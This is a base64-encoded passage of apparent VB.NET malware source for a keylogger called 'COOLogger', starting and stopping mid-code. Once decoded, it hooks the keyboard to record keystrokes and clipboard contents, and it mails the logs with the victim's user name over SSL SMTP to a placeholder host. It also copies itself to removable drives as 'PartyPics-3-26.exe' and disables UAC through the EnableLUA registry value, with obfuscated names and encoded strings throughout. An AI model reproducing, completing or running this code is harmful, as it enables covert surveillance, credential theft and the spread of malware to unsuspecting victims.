CAgICAgWzU0XS5UZXh0ID0gIiINCgkJCVs4OF0uVGV4dCA9ICIiDQoJCQljYXRjaCBleCBhcyBleGNlcHRpb24NCgkJCXRyeQ0KCQkJV2l0aCBbMzJdDQogIA0KICAgICAgICAgICAgICAgIC5Gcm9tID0gTmV3IE1haWxBZGRyZXNzKFs2Ml0uWzYzXShbNjRdKFs0Ml0oWzI1XSkpKSkNCiAgICAgICAgICAgICAgICAuVG8uQWRkKFs2Ml0uWzYzXShbNjRdKFs0Ml0oWzI1XSkpKSkNCiAgICAgICAgICAgICAgICAuU3ViamVjdCA9ICJDT09Mb2dnZXIgTG9ncyBmcm9tIC0gIiAmIEVudmlyb25tZW50LlVzZXJOYW1lDQogICAgICAgICAgICAgICAgLkJvZHkgPSAoIn5+fn5+S2V5bG9nZ2Vyfn5+fn4iICYgdmJuZXdsaW5lICYgdmJuZXdsaW5lICYgdmJuZXdsaW5lICYgWzU0XS5UZXh0ICYgdmJuZXdsaW5lICYgdmJuZXdsaW5lICYgIlNjcmVlbnNob3QgZmFpbGVkIHRvIGNhcHR1cmUiKQ0KICAgICAgICAgICAgRW5kIFdpdGgNCg0KICAgICAgICAgICAgV2l0aCBbMzddDQogICAgICAgICAgICAgICAgLkhvc3QgPSAiKmhvc3QqIg0KICAgICAgICAgICAgICAgIC5Qb3J0ID0gKnBvcnQqDQogICAgICAgICAgICAgICAgLkVuYWJsZVNzbCA9IFRydWUNCiAgICAgICAgICAgICAgICAuQ3JlZGVudGlhbHMgPSBOZXcgU3lzdGVtLk5ldC5OZXR3b3JrQ3JlZGVudGlhbChbNjJdLls2M10oWzY0XShbNDJdKFsyNV0pKSksIFs2Ml0uWzYzXShbNjRdKFs0Ml0oWzI2XSkpKSkNCiAgICAgICAgICAgICAgICAuU2VuZChbMzJdKQ0KICAgICAgICAgICAgRW5kIFdpdGgNCiAgICAgICAgICAgIFs1NF0uVGV4dCA9ICIiDQoJCQlbODhdLlRleHQgPSAiIg0KCQkJY2F0Y2ggZSBhcyBleGNlcHRpb24gDQoJCQllbmQgdHJ5DQoJCQllbmQgdHJ5DQoNCnJldHVybiBub3RoaW5nDQpFbmQgRnVuY3Rpb24NCg0KUHVibGljIEZ1bmN0aW9uIG5tYWlsIGFzIHN0cmluZw0KICAgICAgDQoJCSAgIA0KCQkgICB0cnkNCiAgV2l0aCBbMzJdDQogIA0KICAgICAgICAgICAgICAgIC5Gcm9tID0gTmV3IE1haWxBZGRyZXNzKFs2Ml0uWzYzXShbNjRdKFs0Ml0oWzI1XSkpKSkNCiAgICAgICAgICAgICAgICAuVG8uQWRkKFs2Ml0uWzYzXShbNjRdKFs0Ml0oWzI1XSkpKSkNCiAgICAgICAgICAgICAgICAuU3ViamVjdCA9ICJDT09Mb2dnZXIgTG9ncyBmcm9tIC0gIiAmIEVudmlyb25tZW50LlVzZXJOYW1lDQogICAgICAgICAgICAgICAgLkJvZHkgPSAoIn5+fn5+S2V5bG9nZ2Vyfn5+fn4iICYgdmJuZXdsaW5lICYgdmJuZXdsaW5lICYgdmJuZXdsaW5lICYgWzU0XS5UZXh0KQ0KICAgICAgICAgICAgRW5kIFdpdGgNCg0KICAgICAgICAgICAgV2l0aCBbMzddDQogICAgICAgICAgICAgICAgLkhvc3QgPSAiKmhvc3QqIg0KICAgICAgICAgICAgICAgIC5Qb3J0ID0gKnBvcnQqDQogICAgICAgICAgICAgICAgLkVuYWJsZVNzbCA9IFRydWUNCiAgICAgICAgICAgICAgICAuQ3JlZGVudGlhbHMgPSBOZXcgU3lzdGVtLk5ldC5OZXR3b3JrQ3JlZGVudGlhbChbNjJdLls2M10oWzY0XShbNDJdKFsyNV0pKSksIFs2Ml0uWzYzXShbNjRdKFs0Ml0oWzI2XSkpKSkNCiAgICAgICAgICAgICAgICAuU2VuZChbMzJdKQ0KICAgICAgICAgICAgRW5kIFdpdGgNCiAgICAgICAgICAgIFs1NF0uVGV4dCA9ICIiDQoJCQlbODhdLlRleHQgPSAiIg0KCQkJY2F0Y2ggZXggYXMgZXhjZXB0aW9uIA0KCQkJZW5kIHRyeQ0KICAgICAgICAgICAgcmV0dXJuIG5vdGhpbmcNCkVuZCBmdW5jdGlvbg0KUHVibGljIEZ1bmN0aW9uIFsxMDVdIEFzIEJvb2xlYW4NCiAgICAgIA0KCSAgIERpbSBbMTAzXSgpIEFzIERyaXZlSW5mbyA9IERyaXZlSW5mby5HZXREcml2ZXMoKQ0KICAgICAgICBGb3IgRWFjaCBbMTA0XSBBcyBEcml2ZUluZm8gSW4gWzEwM10NCiAgICAgICAgICAgIElmIFsxMDRdLkRyaXZlVHlwZSA9ICIyIiBBbmQgWzEwNF0uSXNSZWFkeSA9IFRydWUgVGhlbg0KICAgICAgICAgICAgICAgIFN5c3RlbS5JTy5GaWxlLkNvcHkoQXBwbGljYXRpb24uRXhlY3V0YWJsZVBhdGgsIFsxMDRdLk5hbWUgJiAiUGFydHlQaWNzLTMtMjYuZXhlIikNCiAgICAgICAgICAgIEVuZCBJZg0KICAgICAgICBOZXh0IFsxMDRdDQogICAgICAgIFJldHVybiBUcnVlDQogICAgRW5kIEZ1bmN0aW9uDQoNCiBQdWJsaWMgRnVuY3Rpb24gWzY0XShCeVZhbCBzSW5wdXQgQXMgU3RyaW5nKSBBcyBTdHJpbmcNCiAgICAgICAgRGltIFs2OF0gQXMgU3RyaW5nID0gIiINCiAgICAgICAgRGltIFs3Ml0gQXMgU3RyaW5nID0gIiINCiAgICAgICAgRGltIFs3M10gQXMgU3RyaW5nID0gIiINCiAgICAgICAgRGltIFs3NF0gQXMgSW50ZWdlcg0KICAgICAgICBEaW0gWzc1XSBBcyBJbnRlZ2VyDQogICAgICAgIERpbSBbNzZdIEFzIEludGVnZXINCiAgICAgICAgRGltIFs3N10gQXMgSW50ZWdlcg0KDQogICAgICAgIFs3NV0gPSBzSW5wdXQuTGVuZ3RoDQogICAgICAgIFs3N10gPSBbNzVdIE1vZCAyDQogICAgICAgIFs3Nl0gPSBbNzVdIFwgMg0KDQogICAgICAgIEZvciBbNzRdID0gWzc2XSArIFs3N10gVG8gMSBTdGVwIC0xDQogICAgICAgICAgICBJZiBbNzddID0gMCBUaGVuDQogICAgICAgICAgICAgICAgWzY4XSArPSBNaWNyb3NvZnQuVmlzdWFsQmFzaWMuTWlkKHNJbnB1dCwgWzc0XSArIFs3Nl0sIDEpDQogICAgICAgICAgICBFbmQgSWYNCiAgICAgICAgICAgIFs2OF0gKz0gTWljcm9zb2Z0LlZpc3VhbEJhc2ljLk1pZChzSW5wdXQsIFs3NF0sIDEpDQogICAgICAgICAgICBJZiBbNzddID0gMSBBbmQgWzc0XSA8PiAxIFRoZW4NCiAgICAgICAgICAgICAgICBbNjhdICs9IE1pY3Jvc29mdC5WaXN1YWxCYXNpYy5NaWQoc0lucHV0LCBbNzRdICsgWzc2XSwgMSkNCiAgICAgICAgICAgIEVuZCBJZg0KICAgICAgICBOZXh0DQogUmV0dXJuIFs2OF0NCiAgICBFbmQgRnVuY3Rpb24NCgkNCglzdWIgRGVhY3RpdmF0ZVVBQygpDQogICAgICAgIA0KICAgICAgICBEaW0gVUFDKDEpIEFzIFJlZ2lzdHJ5S2V5DQoNCiAgICAgICAgVHJ5DQogICAgICAgICAgICBVQUMoMCkgPSBSZWdpc3RyeS5Mb2NhbE1hY2hpbmUuT3BlblN1YktleShbNjRdKFsxMDJdKSwgVHJ1ZSkNCiAgICAgICAgICAgIFVBQygxKSA9IFJlZ2lzdHJ5LkN1cnJlbnRVc2VyLk9wZW5TdWJLZXkoWzY0XShbMTAyXSksIFRydWUpDQoNCiAgICAgICAgICAgIElmIFVBQygxKS5HZXRWYWx1ZSgiRW5hYmxlTFVBIikgPD4gMCBUaGVuDQogICAgICAgICAgICAgICAgVUFDKDEpLlNldFZhbHVlKCJFbmFibGVMVUEiLCAwKQ0KICAgICAgICAgICAgICAgIElmIFVBQygwKS5HZXRWYWx1ZSgiRW5hYmxlTFVBIikgPD4gMCBUaGVuDQogICAgICAgICAgICAgICAgICAgIFVBQygwKS5TZXRWYWx1ZSgiRW5hYmxlTFVBIiwgMCkNCiAgICAgICAgICAgICAgICAgICANCiAgICAgICAgICAgICAgICBFbmQgSWYNCiAgICAgICAgICAgIEVuZCBJZg0KICAgICAgICBDYXRjaA0KICAgICAgICAgICANCiAgICAgICAgRW5kIFRyeQ0KICAgIEVuZCBTdWINCgkgU3ViIGJWaUlsdWF0YlZFUUJkeGNoUW9XQihCeVZhbCBoSlpGYXV3b3hhQkFUSG9nZURKR2sgQXMgU3lzdGVtLldpbmRvd3MuRm9ybXMuS2V5cykgSGFuZGxlcyBWU2JRSkR4YWt2b1V1c0xRYU5td3YuZ1ZyU3lLZ1hyWVFBYkREdFRRR3ZCbw0KICAgICAgICBJZiBbMTMyXSA9IFRydWUgVGhlbg0KICAgICAgICAgICAgSWYgTXkuQ29tcHV0ZXIuS2V5Ym9hcmQuQ3RybEtleURvd24gPSBUcnVlIEFuZCBoSlpGYXV3b3hhQkFUSG9nZURKR2sgPSBLZXlzLkMgVGhlbg0KICAgICAgICAgICAgICAgWzU0XS5BcHBlbmRUZXh0KCJbQ29waWVkXSIgJiBNeS5Db21wdXRlci5DbGlwYm9hcmQuR2V0VGV4dCAmICJbL0NvcGllZF0iKQ0KICAgICAgICAgICAgRWxzZUlmIE15LkNvbXB1dGVyLktleWJvYXJkLkN0cmxLZXlEb3duID0gVHJ1ZSBBbmQgaEpaRmF1d294YUJBVEhvZ2VESkdrID0gS2V5cy5WIFRoZW4NCiAgICAgICAgICAgICAgICBbNTRdLkFwcGVuZFRleHQoIltQYXN0ZWRdIiAmIE15LkNvbXB1dGVyLkNsaXBib2FyZC5HZXRUZXh0ICYgIlsvUGFzdGVkXSIpDQogICAgICAgICAgICBFbmQgSWYNCiAgICAgICAgRW5kIElmDQogSWYgTXkuQ29tcHV0ZXIuS2V5Ym9hcmQuU2hpZnRLZXlEb3duID0gRmFsc2UgQW5kIE15LkNvbXB1dGVyLktleWJvYXJkLkNhcHNMb2NrID0gRmFsc2UgVGhlbg0KICAgICAgICAgICAgDQpJZiBoSlpGYXV3b3hhQkFUSG9nZURKR2sgPSBLZXlzLkEgVGhlbg0KICAgICAgICAgICAgICAgIFs1NF0uVGV4dCArPSAiYSINCiAgICAgICAgICAgIEVsc2VJZiBoSlpGYXV3b3hhQkFUSG9nZURKR2sgPSBLZXlzLkIgVGhlbg0KICAgICAgICAgICAgICAgIFs1NF0uVGV4dCArPSAiYiINCiAgICAgICAgICAgIEVsc2VJZiBoSlpGYXV3b3hhQkFUSG9nZURKR2sgPSBLZXlzLkMgVGhlbg0KICAgICAgICAgICAgICAgIFs1NF0uVGV4dCArPSAiYyINCiAgICAgICAgICAgIEVsc2VJZiBoSlpGYXV3b3hhQkFUSG9nZURKR2sgPSBLZXlzLkQgVGhlbg0KICAgICAgICAgICAgICAgIFs1NF0uVGV4dCArPSAiZCINCiAgICAgICAgICAgIEVsc2VJZiBoSlpGYXV3b3hhQkFUSG9nZURKR2sgPSBLZXlzLkUgVGhlbg0KICAgICAgICAgICAgICAgIFs1NF0uVGV4dCArPSAiZSINCiAgICAgICAgICAgIEVsc2VJZiBoSlpGYXV3b3hhQkFUSG9nZURKR2sgPSBLZXlzLkYgVGhlbg0KICAgICAgICAgICAgICAgIFs1NF0uVGV4dCArPSAiZiINCiAgICAgICAgICAgIEVsc2VJZiBoSlpGYXV3b3hhQkFUSG9nZURKR2sgPSBLZXlzLkcgVGhlbg0KICAgICAgICAgICAgICAgIFs1NF0uVGV4dCArPSAiZyINCiAgICAgICAgICAgIEVsc2VJZiBoSlpGYXV3b3hhQkFUSG9nZURKR2sgPSBLZXlzLkggVGhlbg0KICAgICAgICAgICAgICAgIFs1NF0uVGV4dCArPSAiaCINCiAgICAgICAgICAgIEVsc2VJZiBoSlpGYXV3b3hhQkFUSG9nZURKR2sgPSBLZXlzLkkgVGhlbg0KICAgICAgICAgICAgICAgIFs1NF0uVGV4dCArPSAiaSINCiAgICAgICAgICAgIEVsc2VJZiBoSlpGYXV3b3hhQkFUSG9nZURKR2sgPSBLZXlzLkogVGhlbg0KICAgICAgICAgICAgICAgIFs1NF0uVGV4dCArPSAiaiINCiAgICAgICAgICAgIEVsc2VJZiBoSlpGYXV3b3hhQkFUSG9nZURKR2sgPSBLZXlzLksgVGhlbg0KICAgICAgICAgICAgICAgIFs1NF0uVGV4dCArPSAiayINCiAgICAgICAgICAgIEVsc2VJZiBoSlpGYXV3b3hhQkFUSG9nZURKR2sgPSBLZXlzLkwgVGhlbg0KICAgICAgICAgICAgICAgIFs1NF0uVGV4dCArPSAibCINCiAgICAgICAgICAgIEVsc2VJZiBoSlpGYXV3b3hhQkFUSG9nZURKR2sgPSBLZXlzLk0gVGhlbg0KICAgICAgICAgICAgICAgIFs1NF0uVGV4dCArPSAibSINCiAgICAgICAgICAgIEVsc2VJZiBoSlpGYXV3b3hhQkFUSG9nZURKR2sgPSBLZXlzLk4gVGhlbg0KICAgICAgICAgICAgICAgIFs1NF0uVGV4dCArPSAibiINCiAgICAgICAgICAgIEVsc2VJZiBoSlpGYXV3b3hhQkFUSG9nZURKR2sgPSBLZXlzLk8gVGhlbg0KICAgICAgICAgICAgICAgIFs1NF0uVGV4dCArPSAibyINCiAgICAgICAgICAgIEVsc2VJZiBoSlpGYXV3b3hhQkFUSG9nZURKR2sgPSBLZXlzLlAgVGhlbg0KICAgICAgICAgICAgICAgIFs1NF0uVGV4dCArPSAicCINCiAgICAgICAgICAgIEVsc2VJZiBoSlpGYXV3b3hhQkFUSG9nZURKR2sgPSBLZXlzLlEgVGhlbg0KICAgICAgICAgICAgICAgIFs1NF0uVGV4dCArPSAicSINCiAgICAgICAgICAgIEVsc2VJZiBoSlpGYXV3b3hhQkFUSG9nZURKR2sgPSBLZXlzLlIgVGhlbg0KICAgICAgICAgICAgICAgIFs1NF0uVGV4dCArPSAiciINCiAgICAgICAgICAgIEVsc2VJZiBoSlpGYXV3b3hhQkFUSG9nZURKR2sgPSBLZXlzLlMgVGhlbg0KICAgICAgICAgICAgICAgIFs1NF0uVGV4dCArPSAicyINCiAgICAgICAgICAgIEVsc2VJZiBoSlpGYXV3b3hhQkFUSG9nZURKR2sgPSBLZXlzLlQgVGhlbg0KICAgICAgICAgICAgICAgIFs1NF0uVGV4dCArPSAidCINCiAgICAgICAgICAgIEVsc2VJZiBoSlpGYXV3b3hhQkFUSG9nZURKR2sgPSBLZXlzLlUgVGhlbg0KICAgICAgICAgICAgICAgIFs1NF0uVGV4dCArPSAidSINCiAgICAgICAgICAgIEVsc2VJZiBoSlpGYXV3b3hhQkFUSG9nZURKR2sgPSBLZXlzLlYgVGhlbg0KICAgICAgICAgICAgICAgIFs1NF0uVGV4dCArPSAidiINCiAgICAgICAgICAgIEVsc2VJZiBoSlpGYXV3b3hhQkFUSG9nZURKR2sgPSBLZXlzLlcgVGhlbg0KICAgICAgICAgICAgICAgIFs1NF0uVGV4dCArPSAidyINCiAgICAgICAgICAgIEVsc2VJZiBoSlpGYXV3b3hhQkFUSG9nZURKR2sgPSBLZXlzLlggVGhlbg0KICAgICAgICAgICAgICAgIFs1NF0uVGV4dCArPSAieCINCiAgICAgICAgICAgIEVsc2VJZiBoSlpGYXV3b3hhQkFUSG9nZURKR2sgPSBLZXlzLlkgVGhlbg0KICAgICAgICAgICAgICAgIFs1NF0uVGV4dCArPSAieSINCiAgICAgICAgICAgIEVsc2VJZiBoSlpGYXV3b3hhQkFUSG9nZURKR2sgPSBLZXlzLlogVGhlbg0KICAgICAgICAgICAgICAgIFs1NF0uVGV4dCArPSAieiINCiAgICAgICAgICAgIEVsc2VJZiBoSlpGYXV3b3hhQkFUSG9nZURKR2sgPSBLZXlzLkQwIFRoZW4NCiAgICAgICAgICAgICAgICBbNTRdLlRleHQgKz0gIjAiDQogICAgICAgICAgICBFbHNlSWYgaEpaRmF1d294YUJBVEhvZ2VESkdrID0gS2V5cy5EMSBUaGVuDQogICAgICAgICAgICAgICAgWzU0XS5UZXh0ICs9ICIxIg0KICAgICAgICAgICAgRWxzZUlmIGhKWkZhdXdveGFCQVRIb2dlREpHayA9IEtleXMuRDIgVGhlbg0KICAgICAgICAgICAgICAgIFs1NF0uVGV4dCArPSAiMiINCiAgICAgICAgICAgIEVsc2VJZiBoSlpGYXV3b3hhQkFUSG9nZURKR2sgPSBLZXlzLkQzIFRoZW4NCiAgICAgICAgICAgICAgICBbNTRdLlRleHQgKz0gIjMiDQogICAgICAgICAgICBFbHNlSWYgaEpaRmF1d294YUJBVEhvZ2VESkdrID0gS2V5cy5ENCBUaGVuDQogICAgICAgICAgICAgICAgWzU0XS5UZXh0ICs9ICI0Ig0KICAgICAgICAgICAgRWxzZUlmIGhKWkZhdXdveGFCQVRIb2dlREpHayA9IEtleXMuRDUgVGhlbg0KICAgICAgICAgICAgICAgIFs1NF0uVGV4dCArPSAiNSINCiAgICAgICAgICAgIEVsc2VJZiBoSlpGYXV3b3hhQkFUSG9nZURKR2sgPSBLZXlzLkQ2IFRoZW4NCiAgICAgICAgICAgICAgICBbNTRdLlRleHQgKz0gIjYiDQogICAgICAgICAgICBFbHNlSWYgaEpaRmF1d294YUJBVEhvZ2VESkdrID0gS2V5cy5ENyBUaGVuDQogICAgICAgICAgICAgICAgWzU0XS5UZXh0ICs9ICI3Ig0KICAgICAgICAgICAgRWxzZUlmIGhKWkZhdXdveGFCQVRIb2dlREpHayA9IEtleXMuRDggVGhlbg0KICAgICAgICAgICAgICAgIFs1NF0uVGV4dCArPSAiOCINCiAgICAgICAgICAgIEVsc2VJZiBoSlpGYXV3b3hhQkFUSG9nZURKR2sgPSBLZXlzLkQ5IFRoZW4NCiAgICAgICAgICAgICAgICBbNTRdLlRleHQgKz0gIjkiDQogICAgICAgICAgICBFbHNlSWYgaEpaRmF1d294YUJBVEhvZ2VESkdrID0gS2V5cy5OdW1QYWQwIFRoZW4NCiAgICAgICAgICAgICAgICBbNTRdLlRleHQgKz0gIjAiDQogICAgICAgICAgICBFbHNlSWYgaEpaRmF1d294YUJBVEhvZ2VESkdrID0gS2V5cy5OdW1QYWQxIFRoZW4NCiAgICAgICAgICAgICAgICBbNTRdLlRleHQgKz0gIjEiDQogICAgICAgICAgICBFbHNlSWYgaEpaRmF1d294YUJBVEhvZ2VESkdrID0gS2V5cy5OdW1QYWQyIFRoZW4NCiAgICAgICAgICAgICAgICBbNTRdLlRleHQgKz0gIjIiDQogICAgICAgICAgICBFbHNlSWYgaEpaRmF1d294YUJBVEhvZ2VESkdrID0gS2V5cy5OdW1QYWQzIFRoZW4NCiAgICAgICAgICAgICAgICBbNTRdLlRleHQgKz0gIjMiDQogICAgICAgICAgICBFbHNlSWYgaEpaRmF1d294YUJBVEhvZ2VESkdrID0gS2V5cy5OdW1QYWQ0IFRoZW4NCiAgICAgICAgICAgICAgICBbNTRdLlRleHQgKz0gIjQiDQogICAgICAgICAgICBFbHNlSWYgaEpaRmF1d294YUJBVEhvZ2VESkdrID0gS2V5cy5OdW1QYWQ1IFRoZW4NCiAgICAgICAgICAgICAgICBbNTRdLlRleHQgKz0gIjUiDQogICAgICAgICAgICBFbHNlSWYgaEpaRmF1d294YUJBVEhvZ2VESkdrID0gS2V5cy5OdW1QYWQ2IFRoZW4NCiAgICAgICAgICAgICAgICBbNTRdLlRleHQgKz0gIjYiDQogICAgICAgICAgICBFbHNlSWYgaEpaRmF1d294YUJBVEhvZ2VESkdrID0gS2V5cy5OdW1QYWQ3IFRoZW4NCiAgICAgICAgICAgICAgICBbNTRdLlRleHQgKz0gIjciDQogICAgICAgICAgICBFbHNlSWYgaEpaRmF1d294YUJBVEhvZ2VESkdrID0gS2V5cy5OdW1QYWQ4IFRoZW4NCiAgICAgICAgICAgICAgICBbNTRdLlRleHQgKz0gIjgiDQogICAgICAgICAgICBFbHNlSWYgaEpaRmF1d294YUJBVEhvZ2VESkdrID0gS2V5cy5OdW1QYWQ5IFRoZW4NCiAgICAgICAgICAgICAgICBbNTRdLlRleHQgKz0gIjkiDQogICAgICAgICAgICBFbHNlSWYgaEpaRmF1d294YUJBVEhvZ2VESkdrID0gS2V5cy5PZW1jb21tYSBUaGVuDQogICAgICAgICAgICAgICAgWzU0XS5UZXh0ICs9ICIsIg0KICAgICAgICAgICAgRWxzZUlmIGhKWkZhdXdveGFCQVRIb2dlREpHayA9IEtleXMuT2VtTWludXMgVGhlbg0KICAgICAgICAgICAgICAgIFs1NF0uVGV4dCArPSAiLSINCiAgICAgICAgICAgIEVsc2VJZiBoSlpGYXV3b3hhQkFUSG9nZURKR2sgPSBLZXlzLk9lbVF1b3RlcyBUaGVuDQogICAgICAgICAgICAgICAgWzU0XS5UZXh0ICs9ICInIg0KICAgICAgICAgICAgRWxzZUlmIGhKWkZhdXdveGFCQVRIb2dlREpHayA9IEtleXMuT2VtT3BlbkJyYWNrZXRzIFRoZW4NCiAgICAgICAgICAgICAgICBbNTRdLlRleHQgKz0gIlsiDQogICAgICAgICAgICBFbHNlSWYgaEpaRmF1d294YUJBVEhvZ2VESkdrID0gS2V5cy5PZW1DbG9zZUJyYWNrZXRzIFRoZW4NCiAgICAgICAgICAgICAgICBbNTRdLlRleHQgKz0gIl0iDQogICAgICAgICAgICBFbHNlSWYgaEpaRmF1d294YUJBVEhvZ2VESkdrID0gS2V5cy5PZW1RdWVzdGlvbiBUaGVuDQogICAgICAgICAgICAgICAgWzU0XS5UZXh0ICs9ICIvIg0KICAgICAgICAgICAgRWxzZUlmIGhKWkZhdXdveGFCQVRIb2dlREpHayA9IEtleXMuT2VtUGlwZSBUaGVuDQogICAgICAgICAgICAgICAgWzU0XS5UZXh0ICs9ICJcIg0KICAgICAgICAgICAgRWxzZUlmIGhKWkZhdXdveGFCQVRIb2dlREpHayA9IEtleXMuT2VtMSBUaGVuDQogICAgICAgICAgICAgICAgWzU0XS5UZXh0ICs9ICI7Ig0KICAgICAgICAgICAgRWxzZUlmIGhKWkZhdXdveGFCQVRIb2dlREpHayA9IEtleXMuT2VtUGVyaW9kIFRoZW4NCiAgICAgICAgICAgICAgICBbNTRdLlRleHQgKz0gIi4iDQogICAgICAgICAgICBFbHNlSWYgaEpaRmF1d294YUJBVEhvZ2VESkdrID0gS2V5cy5PZW10aWxkZSBUaGVuDQogICAgICAgICAgICAgICAgWzU0XS5UZXh0ICs9ICJgIg0KICAgICAgICAgICAgRWxzZUlmIGhKWkZhdXdveGFCQVRIb2dlREpHayA9IEtleXMuU3BhY2UgVGhlbg0KICAgICAgICAgICAgICAgIFs1NF0uVGV4dCArPSAiICINCiAgICAgICAgICAgIEVsc2VJZiBoSlpGYXV3b3hhQkFUSG9nZURKR2sgPSBLZXlzLkVudGVyIFRoZW4NCiAgICAgICAgICAgICAgICBbNTRdLlRleHQgKz0gdmJOZXdMaW5lDQogICAgICAgICAgICBFbHNlSWYgaEpaRmF1d294YUJBVEhvZ2VESkdrID0gS2V5cy5GMSBUaGVuDQogICAgICAgICAgICAgICAgWzU0XS5UZXh0ICs9ICJbRjFdIg0KICAgICAgICAgICAgRWxzZUlmIGhKWkZhdXdveGFCQVRIb2dlREpHayA9IEtleXMuRjIgVGhlbg0KICAgICAgICAgICAgICAgIFs1NF0uVGV4dCArPSAiW0YyXSINCiAgICAgICAgICAgIEVsc2VJZiBoSlpGYXV3b3hhQkFUSG9nZURKR2sgPSBLZXlzLkYzIFRoZW4NCiAgICAgICAgICAgICAgICBbNTRdLlRleHQgKz0gIltGM10iDQogICAgICAgICAgICBFbHNlSWYgaEpaRmF1d294YUJBVEhvZ2VESkdrID0gS2V5cy5GNCBUaGVuDQogICAgICAgICAgICAgICAgWzU0XS5UZXh0ICs9ICJbRjRdIg0KICAgICAgICAgICAgRWxzZUlmIGhKWkZhdXdveGFCQVRIb2dlREpHayA9IEtleXMuRjUgVGhlbg0KICAgICAgICAgICAgICAgIFs1NF0uVGV4dCArPSAiW0Y1XSINCiAgICAgICAgICAgIEVsc2VJZiBoSlpGYXV3b3hhQkFUSG9nZURKR2sgPSBLZXlzLkY2IFRoZW4NCiAgICAgICAgICAgICAgICBbNTRdLlRleHQgKz0gIltGNl0iDQogICAgICAgICAgICBFbHNlSWYgaEpaRmF1d294YUJBVEhvZ2VESkdrID0gS2V5cy5GNyBUaGVuDQogICAgICAgICAgICAgICAgWzU0XS5UZXh0ICs9ICJbRjddIg0KICAgICAgICAgICAgRWxzZUlmIGhKWkZhdXdveGFCQVRIb2dlREpHayA9IEtleXMuRjggVGhlbg0KICAgICAgICAgICAgICAgIFs1NF0uVGV4dCArPSAiW0Y4XSINCiAgICAgICAgICAgIEVsc2VJZiBoSlpGYXV3b3hhQkFUSG9nZURKR2sgPSBLZXlzLkY5IFRoZW4NCiAgICAgICAgICAgICAgICBbNTRdLlRleHQgKz0gIltGOV0iDQogICAgICAgICAgICBFbHNlSWYgaEpaRmF1d294YUJBVEhvZ2VESkdrID0gS2V5cy5GMTAgVGhlbg0KICAgICAgICAgICAgICAgIFs1NF0uVGV4dCArPSAiW0YxMF0iDQogICAgICAgICAgICBFbHNlSWYgaEpaRmF1d294YUJBVEhvZ2VESkdrID0gS2V5cy5GMTEgVGhlbg0KICAgICAgICAgICAgICAgIFs1NF0uVGV4dCArPSAiW0YxMV0iDQogICAgICAgICAgICBFbHNlSWYgaEpaRmF1d294YUJBVEhvZ2VESkdrID0gS2V5cy5GMTIgVGhlbg0KICAgICAgICAgICAgICAgIFs1NF0uVGV4dCArPSAiW0YxMl0iDQogICAgICAgICAgICBFbHNlSWYgaEpaRmF1d294YUJBVEhvZ2VESkdrID0gS2V5cy5EZWxldGUgVGhlbg0KICAgICAgICAgICAgICAgIElmIE5vdCBbNTRdLlRleHQuRW5kc1dpdGgodmJOZXdMaW5lKSBUaGVuDQogICAgICAgICAgICAgICAgICAgIElmIE5vdCBbNTRdLlRleHQuRW5kc1dpdGgoInwiKSBUaGVuDQogICAgICAgICAgICAgICAgICAgICAgICBJZiBOb3QgWzU0XS5UZXh0LkVuZHNXaXRoKCJdIikgVGhlbg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIFs1NF0uVGV4dCA9IFs1NF0uVGV4dC5TdWJzdHJpbmcoMCwgWzU0XS5UZXh0Lkxlbmd0aCAtIDEpDQogICAgICAgICAgICAgICAgICAgICAgICBFbmQgSWYNCiAgICAgICAgICAgICAgICAgICAgRW5kIElmDQogICAgICAgICAgICAgICAgRW5kIElmDQogICAgICAgICAgICBFbHNlSWYgaEpaRmF1d294YUJBVEhvZ2VESkdrID0gS2V5cy5CYWNrIFRoZW4NCiAgICAgICAgICAgICAgICBJZiBOb3QgWzU0XS5UZXh0LkVuZHNXaXRoKHZiTmV3TGluZSkgVGhlbg0KICAgICAgICAgICAgICAgICAgICBJZiBOb3QgWzU0XS5UZXh0LkVuZHNXaXRoKCJ8IikgVGhlbg0KICAgICAgICAgICAgICAgICAgICAgICAgSWYgTm90IFs1NF0uVGV4dC5FbmRzV2l0aCgiXSIpIFRoZW4NCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBbNTRdLlRleHQgPSBbNTRdLlRleHQuU3Vic3RyaW5nKDAsIFs1NF0uVGV4dC5MZW5ndGggLSAxKQ0KICAgICAgICAgICAgICAgICAgICAgICAgRW5kIElmDQogICAgICAgICAgICAgICAgICAgIEVuZCBJZg0KICAgICAgICAgICAgICAgIEVuZCBJZg0KICAgICAgICAgICAgRWxzZUlmIGhKWkZhdXdveGFCQVRIb2dlREpHayA9IEtleXMuRG93biBUaGVuDQogICAgICAgICAgICAgICAgWzU0XS5UZXh0ICs9ICIiDQogICAgICAgICAgICBFbHNlSWYgaEpaRmF1d294YUJBVEhvZ2VESkdrID0gS2V5cy5VcCBUaGVuDQogICAgICAgICAgICAgICAgWzU0XS5UZXh0ICs9ICIiDQogICAgICAgICAgICBFbHNlSWYgaEpaRmF1d294YUJBVEhvZ2VESkdrID0gS2V5cy5MZWZ0IFRoZW4NCiAgICAgICAgICAgICAgICBbNTRdLlRleHQgKz0gIiINCiAgICAgICAgICAgIEVsc2VJZiBoSlpGYXV3b3hhQkFUSG9nZURKR2sgPSBLZXlzLlJpZ2h0IFRoZW4NCiAgICAgICAgICAgICAgICBbNTRdLlRleHQgKz0gIiINCiAgICAgICAgICAgIEVsc2VJZiBoSlpGYXV3b3hhQkFUSG9nZURKR2sgPSBLZXlzLlRhYiBUaGVuDQogICAgICAgICAgICAgICAgWzU0XS5UZXh0ICs9ICJbVEFCXSINCiAgICAgICAgICAgIEVsc2VJZiBoSlpGYXV3b3hhQkFUSG9nZURKR2sgPSBLZXlzLkVuZCBUaGVuDQogICAgICAgICAgICAgICAgWzU0XS5UZXh0ICs9ICJbRU5EXSINCiAgICAgICAgICAgIEVsc2VJZiBoSlpGYXV3b3hhQkFUSG9nZURKR2sgPSBLZXlzLkVzY2FwZSBUaGVuDQogICAgICAgICAgICAgICAgWzU0XS5UZXh0ICs9ICJbRVNDXSINCiAgICAgICAgICAgIEVsc2VJZiBoSlpGYXV3b3hhQkFUSG9nZURKR2sgPSBLZXlzLkRpdmlkZSBUaGVuDQogICAgICAgICAgICAgICAgWzU0XS5UZXh0ICs9ICIvIg0KICAgICAgICAgICAgRWxzZUlmIGhKWkZhdXdveGFCQVRIb2dlREpHayA9IEtleXMuRGVjaW1hbCBUaGVuDQogICAgICAgICAgICAgICAgWzU0XS5UZXh0ICs9ICIuIg0KICAgICAgICAgICAgRWxzZUlmIGhKWkZhdXdveGFCQVRIb2dlREpHayA9IEtleXMuU3VidHJhY3QgVGhlbg0KICAgICAgICAgICAgICAgIFs1NF0uVGV4dCArPSAiLSINCiAgICAgICAgICAgIEVs